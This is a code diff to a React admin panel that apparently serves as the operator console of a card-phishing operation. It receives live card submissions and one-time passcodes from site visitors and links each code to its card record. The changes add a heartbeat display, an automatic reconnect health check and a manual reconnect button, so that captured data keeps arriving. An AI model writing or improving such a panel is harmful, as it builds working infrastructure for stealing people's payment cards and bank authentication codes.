@@ -65,7 +65,8 @@ const AdminPanel = () => {
   });
   const [visitors, setVisitors] = useState<Visitor[]>([]);
   const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
-  const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
+  const [connectionStatus, setConnectionStatus] = useState<string>('Connecting');
+  const [lastHeartbeat, setLastHeartbeat] = useState<Date>(new Date());
   const [notification, setNotification] = useState<string>('');
   const [newVisitorGlow, setNewVisitorGlow] = useState<boolean>(false);
   const [showBankModal, setShowBankModal] = useState(false);
@@ -106,6 +107,7 @@ const AdminPanel = () => {
   useEffect(() => {
     const handleConnect = () => {
       setConnectionStatus('Connected');
+      setLastHeartbeat(new Date());
       console.log('[AdminPanel] WebSocket connected, sending admin_hello.');
       wsClient.send('admin_hello', {});
     };
@@ -115,8 +117,14 @@ const AdminPanel = () => {
       console.log('[AdminPanel] WebSocket disconnected.');
     };
 
+    const handleConnecting = () => {
+      setConnectionStatus('Connecting');
+      console.log('[AdminPanel] WebSocket connecting...');
+    };
+
     const handleCardSubmission = (submission: CardSubmission) => {
       console.log('[AdminPanel] Received card_submission:', submission);
+      setLastHeartbeat(new Date());
       
       // Check if this submission already exists in localStorage
       const isExistingSubmission = existingSubmissionIds.has(submission.id);
@@ -147,6 +155,7 @@ const AdminPanel = () => {
 
     const handleOtpSubmitted = (data: { submission_id: string; otp: string }) => {
       console.log('[AdminPanel] Received otp_submitted:', data);
+      setLastHeartbeat(new Date());
       setCardSubmissions(prev =>
         prev.map(s => (s.id === data.submission_id ? { ...s, otp: data.otp } : s))
       );
@@ -154,6 +163,7 @@ const AdminPanel = () => {
 
     const handleVisitorUpdate = (visitor: Visitor) => {
       console.log('[AdminPanel] Received visitor_update:', visitor);
+      setLastHeartbeat(new Date());
       const myId = wsClient.getSocketId();
       if (visitor.id === myId) return;
       
@@ -179,6 +189,7 @@ const AdminPanel = () => {
 
     const handleEnhancedVisitor = (visitor: Visitor) => {
       console.log('[AdminPanel] Received enhanced_visitor:', visitor);
+      setLastHeartbeat(new Date());
       const myId = wsClient.getSocketId();
       if (visitor.id === myId) return;
       
@@ -245,13 +256,26 @@ const AdminPanel = () => {
     wsClient.on('admin_command', handleAdminCommand);
     wsClient.socket.on('connect', handleConnect);
     wsClient.socket.on('disconnect', handleDisconnect);
+    wsClient.socket.on('connecting', handleConnecting);
 
-    // Connect if not already connected
-    if (wsClient.socket.connected) {
-      handleConnect();
-    } else {
+    // Force connection on mount
+    console.log('[AdminPanel] Forcing WebSocket connection...');
+    if (!wsClient.isConnected()) {
       wsClient.connect();
+    } else {
+      handleConnect();
     }
+
+    // Connection health check
+    const healthCheck = setInterval(() => {
+      if (!wsClient.isConnected()) {
+        setConnectionStatus('Disconnected');
+        console.log('[AdminPanel] Health check: reconnecting...');
+        wsClient.connect();
+      } else {
+        setLastHeartbeat(new Date());
+      }
+    }, 10000);
 
     // Set custom favicon for admin panel only
     const favicon = document.createElement('link');
@@ -272,6 +296,7 @@ const AdminPanel = () => {
 
     // Cleanup function
     return () => {
+      clearInterval(healthCheck);
       console.log('[AdminPanel] Cleaning up and disconnecting.');
       wsClient.off('card_submission', handleCardSubmission);
       wsClient.off('otp_submitted', handleOtpSubmitted);
@@ -418,16 +443,34 @@ const AdminPanel = () => {
 
   return (
     <div className="min-h-screen bg-gray-900 text-white p-4">
-      {/* Connection Status */}
+      {/* Enhanced Connection Status */}
       <div className="flex items-center gap-2 mb-4">
         <span className="text-sm">Connection Status:</span>
-        <span className={`px-2 py-1 rounded ${
+        <span className={`px-2 py-1 rounded flex items-center gap-2 ${
           connectionStatus === 'Connected' ? 'bg-green-600' : 
           connectionStatus === 'Connecting' ? 'bg-yellow-600' : 
           'bg-red-600'
         }`}>
+          {connectionStatus === 'Connected' && <span className="w-2 h-2 bg-green-300 rounded-full animate-pulse"></span>}
+          {connectionStatus === 'Connecting' && <span className="w-2 h-2 bg-yellow-300 rounded-full animate-spin"></span>}
+          {connectionStatus === 'Disconnected' && <span className="w-2 h-2 bg-red-300 rounded-full"></span>}
           {connectionStatus}
         </span>
+        <span className="text-xs text-gray-400">
+          Last activity: {lastHeartbeat.toLocaleTimeString()}
+        </span>
+        
+        {/* Force Reconnect Button */}
+        <button
+          onClick={() => {
+            console.log('[AdminPanel] Manual reconnection triggered');
+            wsClient.disconnect();
+            setTimeout(() => wsClient.connect(), 1000);
+          }}
+          className="ml-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm"
+        >
+          Reconnect
+        </button>
         
         {/* Generate New Token Button */}
         <button
@@ -445,6 +488,23 @@ const AdminPanel = () => {
           Logout
         </button>
       </div>
+
+      {/* Connection Health Warning */}
+      {connectionStatus !== 'Connected' && (
+        <div className="bg-red-600 text-white p-3 rounded-lg mb-4 border-l-4 border-red-300">
+          <div className="flex items-center gap-2">
+            <span className="text-lg">⚠️</span>
+            <div>
+              <div className="font-semibold">Connection Issue Detected</div>
+              <div className="text-sm">
+                {connectionStatus === 'Connecting' 
+                  ? 'Attempting to connect to server...' 
+                  : 'Unable to connect to server. Live data may not be available.'}
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* Modern Live Visitor Count */} 
       <div className="fixed top-4 left-4 z-50">
